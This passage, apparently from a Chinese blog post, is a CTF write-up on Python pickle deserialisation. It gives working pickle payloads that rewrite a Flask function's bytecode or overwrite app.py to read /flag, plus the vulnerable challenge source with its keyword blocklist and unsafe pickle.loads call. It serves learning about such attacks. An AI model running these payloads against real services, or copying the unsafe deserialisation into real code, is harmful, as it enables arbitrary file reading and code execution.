+<p>pickletools.dis看是传入<code>byte</code>成功的，那为什么不行，然后用<code>dis.dis()</code>看了下改前和改后的两个函数有啥变化</p>
+<p>改前</p>
+<p><img loading="lazy" src="images/7675300db20f2d3c210faca1821d692.png" alt="7675300db20f2d3c210faca1821d692"  />
+</p>
+<p>改后</p>
+<p><img loading="lazy" src="images/e67f1f59335491a39e350a91fd92f92.png" alt="e67f1f59335491a39e350a91fd92f92"  />
+</p>
+<p>可以看到<code>16这行</code>后面确实不一样有问题，return都没有了，那只有可能是<code>co_code</code>值的问题。</p>
+<ol start="3">
+<li>最后发现是<code>_codecs.encode</code> utf-8的问题，我们<code>co_code</code>中不符合utf-8编码规范的话会被转化，所以导致传入的不一样。</li>
+</ol>
+<p>上网搜索得到<code>latin-1</code>编码（也叫 <code>ISO-8859-1</code>），我们用这个编码加密出来就没问题啦</p>
+<h2 id="end-poc">end poc<a hidden class="anchor" aria-hidden="true" href="#end-poc">#</a></h2>
+<p>我们这里直接修改<code>admin()</code>方法</p>
+<p><img loading="lazy" src="images/image-20241231150049895.png" alt="image-20241231150049895"  />
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">types</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">secrets</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">builtins</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;app.py&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">secret</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p1</span><span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s1">getattr
+</span></span></span><span class="line"><span class="cl"><span class="s1">p0
+</span></span></span><span class="line"><span class="cl"><span class="s1">c__main__
+</span></span></span><span class="line"><span class="cl"><span class="s1">admin
+</span></span></span><span class="line"><span class="cl"><span class="s1">p3
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g3
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;__code__&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp4
+</span></span></span><span class="line"><span class="cl"><span class="s1">I0
+</span></span></span><span class="line"><span class="cl"><span class="s1">p5
+</span></span></span><span class="line"><span class="cl"><span class="s1">I0
+</span></span></span><span class="line"><span class="cl"><span class="s1">p6
+</span></span></span><span class="line"><span class="cl"><span class="s1">I0
+</span></span></span><span class="line"><span class="cl"><span class="s1">p7
+</span></span></span><span class="line"><span class="cl"><span class="s1">I0
+</span></span></span><span class="line"><span class="cl"><span class="s1">p8
+</span></span></span><span class="line"><span class="cl"><span class="s1">I5
+</span></span></span><span class="line"><span class="cl"><span class="s1">p9
+</span></span></span><span class="line"><span class="cl"><span class="s1">I67
+</span></span></span><span class="line"><span class="cl"><span class="s1">p10
+</span></span></span><span class="line"><span class="cl"><span class="s1">c_codecs
+</span></span></span><span class="line"><span class="cl"><span class="s1">encode
+</span></span></span><span class="line"><span class="cl"><span class="s1">p33
+</span></span></span><span class="line"><span class="cl"><span class="s1">g33
+</span></span></span><span class="line"><span class="cl"><span class="s1">(Vt</span><span class="se">\x00</span><span class="s1">d</span><span class="se">\x01</span><span class="s1">d</span><span class="se">\x02</span><span class="s1">d</span><span class="se">\x03</span><span class="s1">d</span><span class="se">\x04\x8d\x03\xa0\x01\xa1\x00</span><span class="s1">S</span><span class="se">\x00</span><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;latin-1&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp11
+</span></span></span><span class="line"><span class="cl"><span class="s1">(NS&#39;/flag&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;r&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;utf-8&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">(S&#39;encoding&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">ttp12
+</span></span></span><span class="line"><span class="cl"><span class="s1">(S&#39;open&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;read&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tp13
+</span></span></span><span class="line"><span class="cl"><span class="s1">)p14
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_filename&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp15
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_name&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp16
+</span></span></span><span class="line"><span class="cl"><span class="s1">I7
+</span></span></span><span class="line"><span class="cl"><span class="s1">p17
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_lnotab&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp18
+</span></span></span><span class="line"><span class="cl"><span class="s1">)p19
+</span></span></span><span class="line"><span class="cl"><span class="s1">)p20
+</span></span></span><span class="line"><span class="cl"><span class="s1">ctypes
+</span></span></span><span class="line"><span class="cl"><span class="s1">CodeType
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g5
+</span></span></span><span class="line"><span class="cl"><span class="s1">g6
+</span></span></span><span class="line"><span class="cl"><span class="s1">g7
+</span></span></span><span class="line"><span class="cl"><span class="s1">g8
+</span></span></span><span class="line"><span class="cl"><span class="s1">g9
+</span></span></span><span class="line"><span class="cl"><span class="s1">g10
+</span></span></span><span class="line"><span class="cl"><span class="s1">g11
+</span></span></span><span class="line"><span class="cl"><span class="s1">g12
+</span></span></span><span class="line"><span class="cl"><span class="s1">g13
+</span></span></span><span class="line"><span class="cl"><span class="s1">g14
+</span></span></span><span class="line"><span class="cl"><span class="s1">g15
+</span></span></span><span class="line"><span class="cl"><span class="s1">g16
+</span></span></span><span class="line"><span class="cl"><span class="s1">g17
+</span></span></span><span class="line"><span class="cl"><span class="s1">g18
+</span></span></span><span class="line"><span class="cl"><span class="s1">g19
+</span></span></span><span class="line"><span class="cl"><span class="s1">g20
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp21
+</span></span></span><span class="line"><span class="cl"><span class="s1">cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s1">setattr
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g3
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#34;__code__&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">g21
+</span></span></span><span class="line"><span class="cl"><span class="s1">tR.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="n">encrypted_p1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">encrypted_p1</span><span class="p">)</span>
+</span></span></code></pre></div><p>/ppicklee路由<code>pickle反序列化</code>，直接post访问<code>/admin</code>路由就成啦</p>
+<p><img loading="lazy" src="images/image-20241231150224507.png" alt="image-20241231150224507"  />
+</p>
+<h2 id="非预期">非预期<a hidden class="anchor" aria-hidden="true" href="#非预期">#</a></h2>
+<p>使用的pker，直接粘的别人poc（懒</p>
+<p>其实用的<code>python的一个特性</code>，就是当app.py运行时,修改app.py内容是可以成功，且不影响app.py之前代码正常运行，就是修改后，运行还是按照运行前的代码运行，尽管app.py内容变了。</p>
+<p>然后再访问<code>/src</code>就好了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getattr = GLOBAL(&#39;builtins&#39;, &#39;getattr&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">open = GLOBAL(&#39;builtins&#39;, &#39;open&#39;)
+</span></span><span class="line"><span class="cl">flag=open(&#39;/flag&#39;)
+</span></span><span class="line"><span class="cl">read=getattr(flag, &#39;read&#39;)
+</span></span><span class="line"><span class="cl">f=open(&#39;./app.py&#39;,&#39;w&#39;)
+</span></span><span class="line"><span class="cl">write=getattr(f, &#39;write&#39;)
+</span></span><span class="line"><span class="cl">fff=read()
+</span></span><span class="line"><span class="cl">write(fff)
+</span></span><span class="line"><span class="cl">return
+</span></span></code></pre></div><h3 id="pker">pker<a hidden class="anchor" aria-hidden="true" href="#pker">#</a></h3>
+<p>也是看文章了解到，看poc感觉也就是帮我们手搓，但是不是万能的</p>
+<p>下载</p>
+<p><a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p>
+<p>使用方法</p>
+<p><a href="https://xz.aliyun.com/t/7012?time__1311=n4%2BxnD0Dy7it0QYuq05%2BbWNi%3DkqD5DOFDjOxTD#toc-9">https://xz.aliyun.com/t/7012?time__1311=n4%2BxnD0Dy7it0QYuq05%2BbWNi%3DkqD5DOFDjOxTD#toc-9</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat test/SUCTF2019_guess_game_1
+</span></span><span class="line"><span class="cl"><span class="nv">Game</span> <span class="o">=</span> GLOBAL<span class="o">(</span><span class="s1">&#39;guess_game.Game&#39;</span>, <span class="s1">&#39;Game&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">game</span> <span class="o">=</span> GLOBAL<span class="o">(</span><span class="s1">&#39;guess_game&#39;</span>, <span class="s1">&#39;game&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">game.round_count <span class="o">=</span> <span class="m">10</span>
+</span></span><span class="line"><span class="cl">game.win_count <span class="o">=</span> <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ticket</span> <span class="o">=</span> INST<span class="o">(</span><span class="s1">&#39;guess_game.Ticket&#39;</span>, <span class="s1">&#39;Ticket&#39;</span>, 6<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> ticket
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ python3 pker.py &lt; test/SUCTF2019_guess_game_1
+</span></span><span class="line"><span class="cl">b<span class="s2">&#34;cguess_game.Game\nGame\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&#39;round_count&#39;\nI10\ndtbg1\n(N(S&#39;win_count&#39;\nI10\ndtb(I6\niguess_game.Ticket\nTicket\np4\n0g4\n.&#34;</span>
+</span></span></code></pre></div><h3 id="dis">dis<a hidden class="anchor" aria-hidden="true" href="#dis">#</a></h3>
+<p>查看序列化数据操作码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickletools</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x80\x03</span><span class="s2">cbuiltins</span><span class="se">\n</span><span class="s2">exec</span><span class="se">\n</span><span class="s2">q</span><span class="se">\x00</span><span class="s2">X</span><span class="se">\x13\x00\x00\x00</span><span class="s2">key1=b&#39;1&#39;</span><span class="se">\n</span><span class="s2">key2=b&#39;2&#39;q</span><span class="se">\x01\x85</span><span class="s2">q</span><span class="se">\x02</span><span class="s2">Rq</span><span class="se">\x03</span><span class="s2">.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:</span> \<span class="n">x80</span> <span class="n">PROTO</span>      <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">2</span><span class="p">:</span> <span class="n">c</span>    <span class="n">GLOBAL</span>     <span class="s1">&#39;builtins exec&#39;</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">17</span><span class="p">:</span> <span class="n">q</span>    <span class="n">BINPUT</span>     <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">19</span><span class="p">:</span> <span class="n">X</span>    <span class="n">BINUNICODE</span> <span class="s2">&#34;key1=b&#39;1&#39;</span><span class="se">\n</span><span class="s2">key2=b&#39;2&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">43</span><span class="p">:</span> <span class="n">q</span>    <span class="n">BINPUT</span>     <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">45</span><span class="p">:</span> \<span class="n">x85</span> <span class="n">TUPLE1</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">46</span><span class="p">:</span> <span class="n">q</span>    <span class="n">BINPUT</span>     <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">48</span><span class="p">:</span> <span class="n">R</span>    <span class="n">REDUCE</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">49</span><span class="p">:</span> <span class="n">q</span>    <span class="n">BINPUT</span>     <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">51</span><span class="p">:</span> <span class="o">.</span>    <span class="n">STOP</span>
+</span></span><span class="line"><span class="cl"><span class="n">highest</span> <span class="n">protocol</span> <span class="n">among</span> <span class="n">opcodes</span> <span class="o">=</span> <span class="mi">2</span>
+</span></span></code></pre></div><h2 id="总结">总结<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h2>
+<p>其实还有好多想表达的，就写道这里吧。</p>
+<blockquote>
+<p><strong>pickle反序列化 利用的理解</strong></p>
+<p>我觉得其实是通过<code>执行python函数</code>到达恶意效果，但<code>本质上</code>不是执行<code>任意python代码</code>（像<code>del操作</code>就不能直接执行），当然可以借助<code>命令函数</code>(exec,eval等)达到执行<code>任意python代码</code>的效果。但是他本质上还是利用<code>执行python函数</code>到达恶意利用</p>
+</blockquote>
+<p>然后还有点我想说<code>byte</code>那个地方，应该有很多python函数可以代替<code>_codecs.encode</code>的（比如<code>base64</code>），也是自己对python整体了解少的原因吧</p>
+<h3 id="利用">利用<a hidden class="anchor" aria-hidden="true" href="#利用">#</a></h3>
+<p>我上面其实只是示例了一个通过flask路由，然后动态修改路由对应方法实现任意文件读取。</p>
+<p>但是其实已经可以达到实现<code>任意函数任意代码修改</code>了(<code>RCE，内存马</code> 都随便操作了)</p>
+<blockquote>
+<p>其实我本来想写rce的，但是题目把<code>sys.modules['os'] = &quot;not allowed&quot;</code>，得用<code>del sys.modules['os']</code>，然后重新导入os才行（可能还有其他方法，但是我搜到就这个能用）</p>
+<p>然后<code>del</code>属于python 语法操作，不是函数，pickle反序列化不能直接调用，可以借助<code>命令函数来调用</code>，但是这里又把命令函数给过滤了www（我搜到的都过滤了）</p>
+<p>然后其实设置<code>os</code>不可用（这种做法，一般业务也不会这样），我也不太想转这个牛角尖了，所以没用这个做rce这个例子（其实也就是改下函数hhh</p>
+<p>当然有师傅知道上面这个咋搞，欢迎扣我hhh</p>
+</blockquote>
+<h3 id="typescodetype-利用">types.CodeType 利用<a hidden class="anchor" aria-hidden="true" href="#typescodetype-利用">#</a></h3>
+<p>这其实是一个很好的点，感谢出题人让我接触到，这种<code>动态修改函数</code>，操作空间挺大的感觉。</p>
+<p>比如：</p>
+<ul>
+<li>
+<p>只要有变量覆盖这种洞，就可以利用这个点就可以修改函数，然后调用函数达到恶意利用（不过前提还得导入<code>types</code>模块hh</p>
+</li>
+<li>
+<p>还有像python原型链污染这种，就是本质也是变量覆盖</p>
+</li>
+</ul>
+<h2 id="题目源码">题目源码<a hidden class="anchor" aria-hidden="true" href="#题目源码">#</a></h2>
+<p>突然想到可能有师傅想要hhh</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">builtins</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span><span class="n">jsonify</span><span class="p">,</span><span class="n">session</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="s1">&#39;ctfer&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">auth</span> <span class="o">=</span> <span class="n">auth</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Admin</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span><span class="s2">&#34;admin&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Welcome to my application&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">post_login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">password</span> <span class="o">==</span> <span class="n">admin</span><span class="o">.</span><span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Welcome Admin&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Invalid Credentials&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;form method=&#34;post&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!-- /src may help you&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            Username: &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            Password: &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;input type=&#34;submit&#34; value=&#34;Login&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/ppicklee&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ppicklee</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;not allowed&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;not allowed&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">pickle_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">{</span><span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s1">&#39;setstate&#39;</span><span class="p">,</span> <span class="s2">&#34;globals&#34;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">,</span> <span class="s1">&#39;template&#39;</span><span class="p">,</span> <span class="s1">&#39;render&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                 <span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;requests&#39;</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">,</span>  <span class="s1">&#39;pickle&#39;</span><span class="p">,</span><span class="s2">&#34;class&#34;</span><span class="p">,</span><span class="s2">&#34;mro&#34;</span><span class="p">,</span><span class="s2">&#34;flask&#34;</span><span class="p">,</span><span class="s2">&#34;sys&#34;</span><span class="p">,</span><span class="s2">&#34;base&#34;</span><span class="p">,</span><span class="s2">&#34;init&#34;</span><span class="p">,</span><span class="s2">&#34;config&#34;</span><span class="p">,</span><span class="s2">&#34;session&#34;</span><span class="p">}:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="ow">in</span> <span class="n">pickle_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">i</span><span class="o">+</span><span class="s2">&#34; waf !!!!!!!&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;success pickle&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;fail pickle&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">username</span> <span class="o">!=</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s1">&#39;You are not admin!&#39;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Welcome Admin&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/src&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;app.py&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
